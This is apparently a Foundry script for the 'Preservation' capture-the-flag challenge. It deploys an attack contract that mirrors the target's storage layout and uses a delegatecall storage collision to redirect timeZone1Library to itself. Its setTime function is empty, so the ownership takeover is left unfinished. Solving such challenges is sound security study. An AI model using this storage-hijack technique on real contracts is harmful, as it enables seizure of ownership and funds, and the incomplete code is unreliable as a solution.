//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {Preservation} from "../src/Preservation.sol";


contract PreservationAttack  {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
  Preservation preservationInstance = Preservation(0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed);

  uint256 myAddress = uint256(uint160(address(this)));
  function changeToMyAddress() external {
    preservationInstance.setFirstTime(uint256(uint160(address(this))));
    
    console.log(preservationInstance.timeZone1Library());
  }
   function setTime(uint256 _owner) public {
       
    }

}

contract PreservationSolution is Script {

  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    PreservationAttack preservationAttackInstance = new PreservationAttack();
    preservationAttackInstance.changeToMyAddress();
    vm.stopBroadcast();
  }
}